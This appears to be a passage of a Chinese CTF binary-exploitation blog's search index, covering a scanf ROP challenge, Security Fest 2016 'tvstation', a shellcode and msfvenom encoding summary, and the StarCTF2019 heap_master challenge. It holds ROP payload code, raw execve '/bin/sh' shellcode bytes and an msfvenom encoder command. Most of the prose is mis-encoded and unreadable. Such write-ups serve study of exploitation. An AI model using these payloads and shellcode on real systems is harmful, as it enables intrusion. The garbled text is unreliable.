·å¯ä»¥ï¼Œå…·ä½“ç”¨æ³•å†åšå‚è€ƒ\nio.sendline(shellcode1)#ç¬¬ä¸€æ¬¡scanfè¾“å…¥shellcode1\n```\n\nè¿™é‡Œ\"A\"*0x34æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¯¥å‡½æ•°ä¸­å£°æ˜çš„å±€éƒ¨å˜é‡v1è·ç¦»æ ˆåº•æœ‰0x28ï¼Œé‚£ä¹ˆmainå‡½æ•°çš„è¿”å›åœ°å€åº”è¯¥æ˜¯0x28+0x04=0x2cæ‰å¯¹ã€‚ä½†æ˜¯å®é™…ä¸Šï¼Œç”±äºç¨‹åºæœ€å¼€å§‹çš„åŠ¨æ€é“¾æ¥ï¼Œæ˜¯ä»startå¼€å§‹åˆå§‹åŒ–mainå‡½æ•°æ ˆçš„ï¼Œæ‰€ä»¥ç»è¿‡startå‡½æ•°ä¼šç»™mainå‡½æ•°æ ˆä¸Šå‹å…¥ä¸¤ä¸ªå…¨å±€åç§»é‡ã€‚é€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥AAAA,ä½äºFFFDF568,åŠ ä¸Š0x28åº”è¯¥ç­‰äºFFFDF590ï¼Œä½†æ˜¯è¿™é‡Œå´ä¸æ˜¯ebpï¼Œå¾—å†åŠ ä¸Šä¸¤ä¸ª0x04æ‰æ˜¯ebpçš„ä½ç½®ã€‚è¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºè¿è¡Œèµ·æ¥çš„å»¶è¿Ÿç»‘å®šçš„å…³ç³»ï¼Œå‹å…¥æ ˆçš„æ˜¯å…¨å±€åç§»ã€‚ä¸è¿‡ä¸ç”¨ç®¡ï¼Œæ²¡å•¥ç”¨ï¼Œè¿™é‡Œç›´æ¥å†åŠ ä¸Šä¸¤ä¸ª0x04å°±å¥½äº†ï¼Œé€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥è°ƒè¯•å‡ºæ¥ã€‚è€Œä¸”æŸ¥æ±‡ç¼–ä»£ç ï¼Œå‘ç°å¯»å€æ–¹å¼æ˜¯é€šè¿‡espå¯»å€ï¼Œä¹Ÿå°±æ˜¯[esp+18h]ï¼ŒFFFDF550+0x18=FFFDF568ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551130.jpeg)\n\n6.ç¨‹åºè¿è¡Œåˆ°è¿™æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æ¥ç€è¿è¡Œä¸‹å»ä»ç”±äºæˆ‘ä»¬è¦†ç›–çš„æ˜¯mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®©mainè¿”å›åœ°å€è¿”å›åˆ°scanfä¸­ï¼Œæ‰§è¡Œçš„æ˜¯returnå‘½ä»¤ã€‚è€Œå†æ¬¡è¿›å…¥åˆ°scanfå‡½æ•°ä¸­ä¹‹åï¼Œæ‰§è¡Œï¼šio.sendline(â€œ/bin/shâ€)ã€‚å‘ç°binshå¹¶æ²¡æœ‰è¢«è¯»å…¥åˆ°binsh_addrä¸­ï¼Œè¿™æ˜¯å› ä¸ºscanfè¯»å–è¾“å…¥æ—¶çš„æ±‡ç¼–æ“ä½œå¦‚ä¸‹ï¼šå‡è®¾ä¸ºscanf(â€œ%sâ€,&v1);\n\n```\n#æ³¨é‡Šå¤´\n\npush v1\npush %s\npush eip\n```\n\næ ˆçš„åˆ†å¸ƒå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\næ ˆé¡¶\nscanfè¿”å›åœ°å€              ---esp +1\nscanfç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å‚æ•°%s    ---esp+2\nscanfç¬¬äºŒä¸ªè¾“å…¥è¿›çš„å‚æ•°&v1  ---esp+3\n\næ‰§è¡Œæ—¶æ˜¯å–esp +2,esp+3\n```\n\nè€Œæˆ‘ä»¬ç›´æ¥return scanfçš„æ ˆåˆ†å¸ƒå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nscanf ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å‚æ•°%s       ---p32(format_s)   ---esp+1\nscanfç¬¬äºŒä¸ªè¾“å…¥è¿›çš„å‚æ•°&v1     ---p32(binsh_addr)  --esp+2\næ‰§è¡Œæ—¶æ˜¯å–esp+2,esp+3\n```\n\nscanfåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰å°†scanfçš„è¿”å›åœ°å€å‹å…¥æ ˆä¸­ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªè¯»å–çš„æ˜¯esp+2ï¼Œå°†æˆ‘ä»¬éœ€è¦è¾“å…¥çš„binshçš„åœ°å€å½“ä½œäº†æ ¼å¼åŒ–å‚æ•°%sæ¥è¯»å–ï¼Œå‘ç”Ÿé”™è¯¯ã€‚ä¹‹åscanfä¹Ÿæ²¡åŠæ³•æ­£å¸¸è¿”å›\n\n8.æ‰€ä»¥æˆ‘ä»¬ç”¨mainå‡½æ•°çš„returnæ¥è°ƒç”¨scanfæ—¶ï¼Œéœ€è¦ç»™æ ˆå¸ƒç½®ä¸€ä¸ªscanfçš„è¿”å›åœ°å€ï¼Œå¦åˆ™scanfæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šè¯»å–å‚æ•°å‘ç”Ÿé”™è¯¯ï¼Œä¸èƒ½æ­£å¸¸è¯»å–å’Œè¿”å›ã€‚\n\n9.é‚£ä¹ˆç¬¬ä¸€æ¬¡çš„shellcodeé¡ºåºåº”è¯¥æ˜¯â€˜Aâ€™*0x34 + scanf_addr + scanf_returnaddr + format_s + binsh_addrã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nshellcode1 = 'A'*0x34\t#padding\nshellcode1 += scanf_addr # è°ƒç”¨scanfä»¥ä»STDINè¯»å–\"/bin/sh\"å­—ç¬¦ä¸²\nshellcode1 += scanf_retn_addr # scanfè¿”å›åœ°å€\nshellcode1 += format_s # scanfå‚æ•° \nshellcode1 += binsh_addr # \"/bin/sh\"å­—ç¬¦ä¸²æ‰€åœ¨åœ°å€\n```\n\nä¹‹åå¤§å¤šæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š\n\nâ–²ç¬¬ä¸€ç§ï¼šå°†scanfè¿”å›åˆ°mainï¼Œå†æ¬¡æ‰§è¡Œæ ˆæº¢å‡ºï¼š\n\nä¹Ÿå°±æ˜¯å°†scanfçš„è¿”å›åœ°å€è®¾ç½®ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œscanfå‡ºæ¥ä¹‹åï¼Œå›åˆ°mianä¸­ä¹‹åï¼Œç¬¬äºŒæ¬¡çš„shellcodeåº”è¯¥æ˜¯â€™Aâ€™*0x2c +system_addr + system_ret_addr + binsh_addrã€‚è¿™é‡Œçš„system_addrå’Œä¸Šè¿°çš„scanfä¸­æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä¸ºäº†é˜²æ­¢å‡½æ•°è¯»å–å‚æ•°å‘ç”Ÿé”™è¯¯ä»è€Œæ— æ³•æ­£å¸¸æ‰§è¡Œã€‚ä½†æ˜¯è¿™é‡Œçš„system_ret_addrå¯ä»¥éšä¾¿å¡«ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸éœ€è¦è¿”å›systemï¼Œè¿›å…¥åˆ°systemä¹‹åæ‰§è¡Œbinshå°±èƒ½getshelläº†ã€‚è€Œâ€™Aâ€™*2cæ˜¯å› ä¸ºæ ˆçš„çŠ¶æ€å‘ç”Ÿäº†æ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è®¡ç®—ä¸€ä¸‹ã€‚å› ä¸ºå†æ¬¡è¿›å…¥mainå‡½æ•°æ„é€ å‡ºæ¥çš„Mainå‡½æ•°æ ˆåº”è¯¥æ˜¯0x40ï¼Œè€Œä¸æ˜¯ä¹‹å‰0x48è¿™ä¹ˆå¤§äº†ï¼Œæ²¡æœ‰ç»è¿‡startå‡½æ•°åˆå§‹åŒ–mainå‡½æ•°æ ˆï¼Œä¸å­˜åœ¨å‹å…¥çš„å…¨å±€åç§»ï¼Œç³»ç»Ÿåªæ˜¯å°†è¿™æ¬¡çš„mainå‡½æ•°å½“ä½œä¸€ä¸ªæ™®é€šçš„å‡½æ•°æ¥æ„é€ æ ˆã€‚\n\næ‰€ä»¥è¿™ä¸€æ¬¡æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è·ç¦»æ ˆåº•å°±ç¡®å®åªæœ‰0x28è¿™ä¹ˆè¿œäº†ï¼Œé‚£ä¹ˆè®¡ç®—ä¸€ä¸‹0x28+0x04=0x2cï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡çš„paddingå°±æ˜¯0x2cã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nshellcode2 = 'B'*0x2c\t#padding\nshellcode2 += system_addr #è·³è½¬åˆ°systemå‡½æ•°ä»¥æ‰§è¡Œsystem(\"/bin/sh\")\nshellcode2 += main_addr # systemå‡½æ•°è¿”å›åœ°å€ï¼Œéšä¾¿å¡«\nshellcode2 += binsh_addr #systemå‡½æ•°çš„å‚æ•°\n```\n\n \n\nâ–²ç¬¬äºŒç§ï¼šå°†scanfçš„è¿”å›åœ°å€æ‹¿æ¥åšæ–‡ç« ï¼Œé€šè¿‡ropå°†espç›´æ¥ä¸‹æ‹‰ä¸¤ä¸ª0x04åˆ°è¾¾æˆ‘ä»¬è¾“å…¥çš„systemï¼Œç„¶ååœ¨ä»ä¹‹åçš„åœ°æ–¹è¯»å–binshå­—ç¬¦ä¸²ï¼Œä¸€æ¬¡payloadç›´æ¥æå®šï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551712.png)\n\né€šè¿‡æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨scanfæ—¶çš„æ ˆçŠ¶æ€åº”è¯¥è·Ÿä¸‹å›¾ä¸€æ ·ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551658.png)\n\næ‰€ä»¥æˆ‘ä»¬scanfå‡½æ•°è¿”å›æ—¶espåº”è¯¥è¿˜æ˜¯æŒ‡å‘çš„formatå‚æ•°åœ°å€æ‰å¯¹ï¼Œé‚£ä¹ˆä¸ºäº†å°†espä¸‹æ‹‰ä¸¤ä¸ª0x04ï¼Œåˆ°è¾¾è¾“å…¥çš„systemå‡½æ•°åœ°å€ï¼Œå°±éœ€è¦ä¸¤ä¸ªPopæ“ä½œï¼Œè¿™é‡Œé€šè¿‡ROPgadgetå¯ä»¥æŸ¥å‡ºæ¥ï¼Œæˆ–è€…ç›´æ¥ä»initä»€ä¹ˆçš„åˆå§‹åŒ–æ®µä¸­æ‰¾ä¸‡èƒ½gadgetï¼ŒåŒæ ·å­˜åœ¨å¤šä¸ªPopæ“ä½œã€‚é‚£ä¹ˆè¿™æ ·çš„åŒ–å°±åªæœ‰ä¸€æ¬¡payloadï¼Œæ‰€ä»¥æ€»çš„payloadå°±åº”è¯¥æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nshellcode1 = 'A'*0x34 #padding\nshellcode1 += scanf_addr # è°ƒç”¨scanfä»¥ä»STDINè¯»å–\"/bin/sh\"å­—ç¬¦ä¸²\nshellcode1 += pop_pop_ret_addr# scanfè¿”å›ååˆ°ä¸¤ä¸ªPopæ“ä½œå¤„\nshellcode1 += format_s # scanfå‚æ•°\nshellcode1 += binsh_addr #ä½œä¸ºscanfçš„å‚æ•°è¯»å–binshå­—ç¬¦ä¸²\nshellcode1 += system_addr # \"/bin/sh\"å­—ç¬¦ä¸²æ‰€åœ¨åœ°å€\nshellcode1 += binsh_addr #ä½œä¸ºsystemçš„å‚æ•°getshell\n```\n\nâ–²è¿™é‡Œå†ç»™å‡ºç¬¬ä¸‰ç§æ–¹æ¡ˆï¼Œä¹Ÿæ¯”è¾ƒå®¹æ˜“ç†è§£\n\nè¿™ä¸ªæ–¹æ¡ˆæ˜¯åŸºäºç¬¬ä¸€ç§çš„ï¼Œè¦†ç›–scanfè¿”å›åœ°å€ä¸ºstartå‡½æ•°ï¼Œè¿™æ ·mainå‡½æ•°æ ˆåˆé‡æ–°åˆå§‹åŒ–ï¼Œç›¸å½“é‡æ–°æ‰§è¡Œä¸€æ¬¡ç¨‹åºï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡çš„shellcodeçš„paddingå­—ç¬¦ä¸ªæ•°è¿˜æ˜¯0x34ä¸ªAï¼Œä¹‹åå°±å¸¸è§„è¦†ç›–eipè·³è½¬systemå‡½æ•°getshelläº†ã€‚ä½†æ˜¯è¿™é‡Œç›´æ¥å†™startå‡½æ•°çš„é¦–åœ°å€ä¼šå‡ºé”™ï¼Œå› ä¸ºè¿™é‡Œçš„starté¦–åœ°å€ä¸º0x08048420ï¼Œæœ«å°¾ä¸º20ï¼Œè½¬åŒ–æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ã€‚è€Œè¯»å…¥æˆ‘ä»¬è¾“å…¥çš„åˆæ˜¯scanfï¼Œscanfä¸æ”¯æŒç©ºæ ¼å½•å…¥ï¼Œæ‰€ä»¥é‡åˆ°ç©ºæ ¼å°±ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå¯¼è‡´è¯»ä¸è¿›å»ã€‚è€Œè¿™é‡Œåˆæ˜¯å› ä¸ºå¤§ç«¯åºï¼Œå¦‚æœå‘ç”Ÿ0x08048420ï¼Œé‚£ä¹ˆå…ˆå‘é€çš„å­—ç¬¦æ˜¯0x20ï¼Œä¹Ÿå°±æ˜¯ç©ºæ ¼ï¼Œé‚£ä¹ˆå°±ç›´æ¥æˆªæ–­ï¼Œä¹‹åæ‰€æœ‰æ•°æ®éƒ½è¯»ä¸äº†äº†ã€‚æ‰€ä»¥è¿™é‡Œå¦‚æœéœ€è¦ä¼ å…¥startå‡½æ•°ï¼Œåˆ™å°†startå‡½æ•°ä¸‹æ‹‰ä¸¤ä¸ªå­—èŠ‚ï¼Œä¼ å…¥0x08048422ã€‚çœ‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551445.jpeg)\n\nstartå‡½æ•°ä½“çš„ç¬¬ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤æ˜¯xor ebp,ebpã€‚å¼‚æˆ–æ“ä½œï¼Œå°±æ˜¯å°†ebpæ¸…ç†å¥½åˆå§‹åŒ–è€Œå·²ï¼Œå•¥ç”¨ä¹Ÿæ²¡æœ‰ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è·³è¿‡ï¼Œåˆ°pop esiå°±è¡Œã€‚å…·ä½“ä»£ç å°±æ˜¯å°†ç¬¬ä¸€ç§æ–¹æ¡ˆçš„ç§ç¬¬ä¸€æ®µshellcodeçš„main_addræ”¹æˆstart_addr+0x02ï¼Œç„¶ååç§»éƒ½æ˜¯0x34å°±è¡Œã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.cnblogs.com/sweetbaby/p/14148625.html\n\n \n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Security Fest CTF 2016-tvstation","url":"/2021/08/14/Security Fest CTF 2016-tvstation/","content":"\n \n\n1.é¢˜ç›®ç»™äº†libcåº“ï¼Œéœ€è¦æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ï¼Œç›´æ¥æ‹–åˆ°Linuxä¸­è¿è¡Œä¸€ä¸‹./libc.so.6_x64ï¼Œå°±å¯ä»¥çŸ¥é“æ˜¯libc2.24çš„ï¼Œä½†Linuxä¸­çš„libcæ²¡æœ‰è¯¥ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç”¨pwndockeræ¥è¿æ¥è¿è¡Œã€‚å…·ä½“æ€ä¹ˆç”¨çœ‹ä¸‹æ–¹é“¾æ¥ï¼ŒåŒæ ·dockerä¹Ÿè‡ªè¡Œå­¦ä¹ ã€‚\n\nhttps://github.com/skysider/pwndocker\n\nå¦‚æœéœ€è¦ä½¿ç”¨åˆ°è¿™ä¸ªlibcè°ƒè¯•ï¼Œåˆ™åœ¨pythonä¸­è®¾ç½®ä¸‹åˆ—ä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n```\n\n2.ç„¶åå¼€å§‹åˆ†ææ–‡ä»¶ï¼Œå¸¸è§„checksecï¼Œå¼€äº†NXï¼ŒIDAæ‰“å¼€æ–‡ä»¶æ‰¾æ¼æ´ï¼Œå‘ç°è¾“å…¥4è¿›å…¥debugå‡½æ•°åå¯ä»¥æ³„éœ²systemçš„å†…å­˜åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nv0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, \"system\");\nsprintf(fmsg, info, v0);\nv1 = strlen(fmsg);\nwrite(1, fmsg, v1);\n```\n\ndlsym()çš„å‡½æ•°åŸå‹æ˜¯\n\nvoid* dlsym(void* handle,const char* symbol);\n\nè¯¥å‡½æ•°åœ¨<dlfcn.h>æ–‡ä»¶ä¸­,handleæ˜¯ç”±dlopenæ‰“å¼€åŠ¨æ€é“¾æ¥åº“åè¿”å›çš„æŒ‡é’ˆï¼Œsymbolå°±æ˜¯è¦æ±‚è·å–çš„å‡½æ•°çš„åç§°ï¼Œå‡½æ•°è¿”å›å€¼æ˜¯void*,æŒ‡å‘å‡½æ•°çš„åœ°å€ï¼Œä¾›è°ƒç”¨ä½¿ç”¨ã€‚writeå‡½æ•°çš„fdæ˜¯1ï¼Œæ‰€ä»¥å°±ç›¸å½“äºç›´æ¥æ‰“å°åœ¨å±å¹•ä¸Šï¼Œè¿™é‡Œæ¶‰åŠlinuxç³»ç»Ÿè°ƒç”¨å·å†…å®¹ï¼Œå¯ä»¥ç›´æ¥æŸ¥linuxä¸‹çš„ç›®å½•/usr/include/asm/ä¸­çš„unistd_32.hå’Œunistd_64.hã€‚\n\nè¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æŠŠæŒ‡å‘systemå‡½æ•°çš„æŒ‡é’ˆè¿”å›ç»™v0,ç„¶åå°†v0æ ¼å¼åŒ–è¾“å‡ºç»™fmsgï¼Œä¹‹åå°†fmsgåŸå°ä¸åŠ¨æ‰“å°åœ¨å±å¹•ä¸Šï¼Œç¬¬ä¸€æ¬¡çœ‹åˆ°çŒœä¸å‡ºæ¥å¯ä»¥ç›´æ¥è¿è¡Œè¯¥æ–‡ä»¶è¯•è¯•å‘—ã€‚ä¹‹åä¼šè¿›å…¥ä¸€ä¸ªdebug_func()ï¼Œè¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 buf; // [rsp+0h] [rbp-20h]\nreturn read(0, &buf, 0xC8uLL);\n```\n\n3.ç°åœ¨æœ‰äº†systemçš„å†…å­˜åœ°å€å’Œæ ˆæº¢å‡ºï¼Œå°±å·®/bin/shå­—ç¬¦ä¸²äº†ã€‚è¿™é‡Œç”¨IDAæ‰“å¼€é¢˜ç›®ç»™çš„libcæ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°bin/shå­—ç¬¦ä¸²çš„åœ°å€binsh_libc_addrå’Œsystemçš„åœ°å€system_libc_addrã€‚æ‰€ä»¥è¿™å°±ç›¸å½“äºæœ‰systemçš„è¢«libcåŠ è½½çš„çœŸå®åœ°å€ï¼Œé‚£ä¹ˆsystemçš„çœŸå®system_addrå‡å»system_libc_addrå°±å¯ä»¥å¾—åˆ°Libcè¢«åŠ è½½è¿›æ¥çš„é¦–åœ°å€libc_start_addrã€‚å³ç°æŒæ¡åœ°å€ï¼šlibc_start_addrï¼Œsystem_addrï¼Œsystem_libc_addrï¼Œbinsh_libc_addré€šè¿‡è®¡ç®—å¯å¾—ï¼šbinsh_addr = system_addr - system_libc_addr + binsh_libc_addrã€‚è¿™ä¸æ˜¯æ ˆæº¢å‡ºæœ‰äº†ï¼Œsystemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²çš„çœŸå®åœ°å€æœ‰äº†ï¼Œè¿™ä¸ç›´æ¥getshellå°±å®Œäº‹äº†å—ï¼Œé—¹å•¥å‘¢ï¼Œè¿™ç ´é¢˜ç›®ï¼Œæ²¡ç‚¹æŠ€æœ¯å«é‡ã€‚\n\n4.ä½†ç¨‹åºè¿˜æ˜¯å¾—èµ°èµ°ï¼Œ64ä½ç¨‹åºï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ROPgadgetè¡¨æ¥æŸ¥æ‰¾pop rdi ; retè¿™ä¸ªä»£ç æ‰€åœ¨çš„åœ°å€ï¼Œä¹Ÿæ˜¯åœ¨Libcä¸­æŸ¥æ‰¾åˆ°ï¼Œç„¶ååŠ ä¸Šlibc_start_addrå°±å¯å¾—åˆ°pop_rdi_addrã€‚\n\n5.ä¹‹åè®¡ç®—åç§»é‡ï¼Œè¿œç¨‹è°ƒè¯•ä¸‹è¿›è¡Œï¼Œpayloadä¾æ¬¡ä¸ºpadding + pop_rdi_addr + binsh_addr + system_addrã€‚\n\n6.å†è€ƒè™‘è¾“å…¥æƒ…å†µï¼šå…ˆåœ¨Linuxä¸‹è¿è¡Œï¼Œæ‰€ä»¥èƒ½çœ‹åˆ°éœ€è¦åœ¨æ¥æ”¶åˆ°â€: â€æ—¶å¯ä»¥è¾“å…¥4ï¼Œç„¶åè¿›å…¥åˆ°æ‰“å°system_addrï¼Œæ‰“å°å®Œä¹‹åï¼Œéœ€è¦ä»æ‰“å°å‡ºæ¥çš„systemåœ°å€è¯»å–è¿›æˆ‘ä»¬è®¾å®šçš„system_addrã€‚\n\n7.ç”±äºæ‰“å°æ ¼å¼æ˜¯@x0x7ffffffï¼Œæ‰€ä»¥åœ¨recvuntilâ€@xâ€ï¼Œä¹‹åå¼€å§‹è·å–æ‰“å°çš„system_addr:system_addr = int(io.recv(12), 16)ï¼Œä»¥åå…­è¿›åˆ¶æ€»å…±è¯»å–12ä½\n\n8.è¯»å–å®Œæˆsystem_addråå°±å¯ä»¥å¼€å§‹è¾“å…¥payloadï¼Œä¹‹åå°±å¯ä»¥interactive()ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Shellcodeæ±‡æ€»","url":"/2021/08/14/ShellCodeæ±‡æ€»/","content":"\nä¸€ã€shellcodeçš„æŸ¥æ‰¾å’Œè·å–ï¼š\n\n1.åœ°å€ï¼šhttp://shell-storm.org/shellcode/\n\n2.è·å–æ–¹å¼ï¼šå¯ä»¥é€šè¿‡linux/x86/sh/bash/execve/shellcodeç­‰ç­‰å…³é”®è¯æ¥æŸ¥æ‰¾\n\n \n\näºŒã€shellcodeçš„ç¼–ç ï¼š\n\nç¤ºä¾‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n```\n\n1.â€™import sys; sys.stdout.write(â€œshellcodeâ€)â€™ï¼šè¿™æ˜¯å¯¼å…¥åŒ…ä¹‹åå†™å…¥ç¼–ç çš„shellcodeã€‚\n\n2.ç”±äºmsfvenomåªèƒ½ä»stdinä¸­è¯»å–ï¼Œæ‰€ä»¥ä½¿ç”¨Linuxç®¡é“ç¬¦â€|â€æ¥ä½¿å¾—shellcodeä½œä¸ºpythonç¨‹åºçš„è¾“å‡ºã€‚\n\n3.æ­¤å¤–é…ç½®ç¼–ç å™¨ä¸ºx86/alpha_mixedï¼Œé…ç½®ç›®æ ‡å¹³å°æ¶æ„ç­‰ä¿¡æ¯ï¼Œè¾“å‡ºåˆ°æ–‡ä»¶åä¸ºpayloadçš„æ–‡ä»¶ä¸­ã€‚\n\n4.Shellcodeçš„æ‰§è¡Œæ¡ä»¶ä¸€èˆ¬éƒ½æ˜¯call Registerï¼Œè¿™é‡Œçš„BufferRegisterè®¾ç½®æ˜¯å› ä¸ºé€šè¿‡æŒ‡ä»¤call eaxè°ƒç”¨shellcode,æ‰€ä»¥é…ç½®BufferRegister=EAXã€‚æœ€åå³å¯åœ¨payloadä¸­çœ‹åˆ°å¯¹åº”çš„è¢«ç¼–ç åçš„ä»£ç ã€‚\n\n \n\nä¸‰ã€shellcodeçš„ä¸¤æ®µæ‰§è¡Œï¼š\n\n1.éœ€è¦æ³„éœ²RWXæ®µçš„åœ°å€ï¼Œè¯»å–æ³„éœ²åœ°å€ï¼š\n\n2.éœ€è¦è·³è½¬jmpå‘½ä»¤æˆ–è€…æ˜¯return/callï¼Œä½†æ˜¯returnä¼špop eipï¼Œcallä¼špush eipï¼Œéƒ½ä¼šä¿®æ”¹æ‰æ ˆä¸­çš„å†…å®¹ã€‚å¦‚æœshellcodeçš„ä¸¤æ®µæ‰§è¡Œè®¡ç®—åç§»åœ°å€çš„è¯ï¼Œå¯èƒ½éœ€è¦å°†è¿™ä¸¤ä¸ªå†…å®¹ä¹Ÿè®¡ç®—è¿›å…¥ã€‚ä½†æ˜¯jmpå°±ä¸ä¼šéœ€è¦ï¼Œæ˜¯ç›´æ¥æ— æ¡ä»¶è·³è½¬ï¼Œæ‰€ä»¥å¤§å¤šæ—¶å€™é€‰æ‹©jmpæ¯”è¾ƒå¥½ã€‚\n\n \n\n \n","tags":["Fmstr"],"categories":["PWN","Shellcode0x2"]},{"title":"StarCTF2019_heap_master","url":"/2021/08/14/StarCTF2019_heap_master/","content":"\nè¿™é“é¢˜å­¦åˆ°äº†å¾ˆå¤šï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚\n\n# 1.å¸¸è§„checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€ã€‚\n\n# 2.å‡½æ•°è§£æï¼š\n\næ¯”è¾ƒå¸¸è§„çš„èœå•é¢˜ï¼Œè¿™é‡Œçš„addæ˜¯æ­£å¸¸ï¼Œä½†æ˜¯ç¨‹åºæœ€å¼€å§‹mmapä¸€å—0x10000å¤§å°çš„chunkï¼Œä¹‹åçš„editå’Œdeleteéƒ½æ˜¯é’ˆå¯¹è¿™ä¸ªæœ€å¼€å§‹mmapå‡ºæ¥çš„chunkã€‚\n\n(1)editå‡½æ•°ï¼šè¾“å…¥åç§»ï¼Œé’ˆå¯¹m_chunk_addrå¯¹åº”åç§»ä¿®æ”¹ã€‚æ¯”å¦‚m_chunk_addr=0x100ï¼Œåç§»ä¸º0x10ï¼Œä¿®æ”¹å†…å®¹ä¸º'M'é‚£ä¹ˆä¿®æ”¹å†…å®¹ä¸º*(0x100+0x10) = 'M'ï¼Œå³*(m_chunk_addr+offset) = change_contã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-2.png)\n\n(2)deleteå‡½æ•°ï¼šåŒæ ·è¾“å…¥åç§»é’ˆå¯¹m_chunk_addrå¯¹åº”åç§»freeï¼Œç”±äºæ²¡æœ‰æŒ‡é’ˆçš„ç›¸å…³æ“ä½œï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨UAFã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-2.png)\n\n# 3.æ¼æ´è§£æï¼š\n\n(1)ç”±äºmmapçš„æ•°æ®å¯ä»¥ä»»æ„ä¼ªé€ å’Œé‡Šæ”¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªé‡Šæ”¾ä»»æ„å¤§å°chunkï¼Œåœ¨æ²¡æœ‰åŠæ³•æ³„éœ²åœ°å€çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©è¿›è¡Œçˆ†ç ´global_max_fastï¼Œåˆ©ç”¨unsortedbin attackåœ¨global_max_fastä¸Šå†™ä¸‹main_arenaåœ°å€ï¼Œä½¿å¾—fastbinYæ•°ç»„å¯ä»¥è¶Šç•Œå†™ã€‚\n\n(2)ä¹‹åå†åˆ©ç”¨é‡Šæ”¾ä»»æ„å¤§å°çš„chunkï¼Œä»main_arenaä¸­fastbinYæ•°ç»„è¶Šç•Œå¾€åå†™ï¼Œä¿®æ”¹_IO_2_1_stoutç»“æ„ä½“çš„_IO_write_baseã€_IO_write_ptrã€_IO_read_endã€_IO_write_endä¸ºmmapä¸­æ”¾å…¥unsortedbinçš„å 